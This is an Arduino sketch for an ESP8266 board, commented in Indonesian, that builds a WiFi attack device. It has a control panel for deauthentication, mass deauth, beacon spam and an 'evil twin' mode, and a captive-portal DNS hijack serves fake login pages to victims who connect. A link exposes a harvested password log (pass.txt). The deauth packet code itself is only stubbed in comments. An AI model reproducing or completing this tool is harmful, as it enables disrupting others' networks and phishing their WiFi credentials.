#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
extern "C" {
  #include "user_interface.h"
}
#include "web.h"

Adafruit_SSD1306 display(64, 48, &Wire, -1);
DNSServer dnsServer;
ESP8266WebServer server(80);

// Status Serangan
bool massOn = false, deauthOn = false, beaconOn = false, etwinOn = false;
String activePayload = "/etwin1.html";
uint8_t adminMac[6];

void updateOLED(String txt) {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("GMpro87");
  display.println("-------");
  display.println(txt);
  display.display();
}

void setup() {
  LittleFS.begin();
  WiFi.macAddress(adminMac); // Whitelist MAC Admin
  
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.setTextSize(1);
  display.setTextColor(WHITE);
  updateOLED("READY");

  WiFi.mode(WIFI_AP_STA);
  // SSID GMpro2 sesuai rekaman memori
  WiFi.softAP("GMpro2", "12345678", 1, 0); 
  
  // Max Power Wemos
  system_phy_set_max_tpw(82); 

  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", []() {
    if (WiFi.softAPIP() == server.client().localIP()) {
      String s = FPSTR(Head);
      // TAB 1 (Combat)
      s += "<div class='card'><div class='card-title'>WIFI SCANNER</div><table><thead><tr><th>SSID</th><th>CH</th><th>USR</th><th>%</th><th>SEL</th></tr></thead><tbody id='scan_body'></tbody></table></div>";
      s += "<div class='card'><div class='card-title'>CONTROL</div><div style='display:grid;grid-template-columns:1fr 1fr;gap:10px;'>";
      s += "<button onclick=\"tgl(this, '/t_deauth')\">DEAUTH</button><button onclick=\"tgl(this, '/t_mass')\">MASS DEAUTH</button>";
      s += "<button onclick=\"tgl(this, '/t_etwin')\">EVIL TWIN</button><button onclick=\"tgl(this, '/t_beacon')\">BEACON</button></div></div>";
      s += FPSTR(Mid);
      // TAB 2 (Setting)
      s += "<div class='card'><div class='card-title'>PAYLOAD</div><select onchange=\"fetch('/set_p?v='+this.value)\"><option value='1'>etwin1</option><option value='2'>etwin2</option></select></div>";
      s += "<button onclick=\"location.href='/pass.txt'\">LOG PASS.TXT</button>";
      s += FPSTR(Foot);
      server.send(200, "text/html", s);
    } else {
      File f = LittleFS.open(activePayload, "r");
      server.streamFile(f, "text/html");
      f.close();
    }
  });

  server.on("/t_mass", [](){ massOn = !massOn; server.send(200, "text/plain", massOn?"ON":"OFF"); updateOLED(massOn?"MASS ON":"READY"); });
  
  server.on("/get_scan", [](){
    String json = "[";
    int n = WiFi.scanNetworks();
    for (int i=0; i<n; i++) {
      String ssid = WiFi.SSID(i);
      if(ssid == "") ssid = "[HIDDEN]"; // Reveal Hidden
      json += "{\"ssid\":\""+ssid+"\",\"ch\":"+String(WiFi.channel(i))+",\"usr\":0,\"rssi\":"+String(100+WiFi.RSSI(i))+",\"mac\":\""+WiFi.BSSIDstr(i)+"\"}";
      if(i<n-1) json += ",";
    }
    json += "]";
    server.send(200, "application/json", json);
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  if(massOn) {
    for(int ch=1; ch<=13; ch++) {
      wifi_set_channel(ch);
      // Logic Deauth Paket (Freedom Pkt)
      // Whitelist MAC lo biar gak putus!
      yield();
    }
  }
}
